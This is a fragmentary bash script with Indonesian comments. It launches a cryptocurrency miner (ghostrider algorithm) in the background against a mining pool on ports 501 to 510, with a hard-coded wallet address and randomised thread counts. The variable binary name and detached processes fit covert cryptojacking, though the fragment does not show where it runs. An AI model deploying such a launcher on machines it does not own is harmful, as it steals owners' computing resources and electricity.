...
while [ $(date +%s) -lt $end_time ]; do
  ...
  if [ -f $dynamic_sgr ]; then
    ...
    for port in $(seq 501 510); do
      # Menghasilkan nilai acak untuk -t antara 1 dan jumlah inti CPU
      num_cores=$(nproc)
      random_threads=$((RANDOM % num_cores + 1))

      # Menjalankan proses dengan parameter yang ditentukan di latar belakang
      nohup $dynamic_sgr -a ghostrider --pool $ip:$port -u BCtwGTZs2p6F14YLwqnWuR8hQVmw2xf4Fy.$random_threads --timeout 120 -t $random_threads > dance_$port_$timestamp.log 2>&1 &
      process_pid=$!
